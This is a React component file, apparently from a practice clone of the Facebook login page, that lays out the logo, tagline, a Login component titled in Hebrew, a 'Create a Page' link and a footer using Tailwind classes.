import React from "react";
import Login from "./Login.jsx";
import Footer from "./Footer.jsx";
import Link from "./Link.jsx";

const App = () => {
  return (
    <div className="bg-facebookbg flex flex-col sm:bg-white">
      <div className="2xl:hidden sm:block  bg-yellow-50 p-5">
        <span>Get Facebook for Android and browse faster.</span>
      </div>
      <section className="h-auto w-full pt-130px pb-28 sm:pt-1 sm:pb-0 ">
        <div className="max-w-980px m-auto flex justify-between sm:flex-col sm:justify-center">
          <div className="w-500px sm:w-full sm:flex sm:justify-center">
            <img
              className="pt-24 -ml-28px -mb-8px w-300px sm:w-28 sm:pt-2 "
              src="../../public/images/logo.svg"
              alt="facebook"
            />
            <h2 className="text-28px leading-8  sm:hidden">
              Connect with friends and the world around you on Facebook.
            </h2>
          </div>
          <div className="">
            <Login title="התחבר/י לפייסבוק" />
            <div className="text-sm text-center sm:hidden">
              <Link className="font-semibold text-sm" text="Create a Page" /><span> for a celebrity, band or business</span> 
            </div>
          </div>
        </div>
      </section>
      <footer className="h-40 w-full flex flex-col bg-white">
        <Footer />
      </footer>
    </div>
  );
};

export default App;
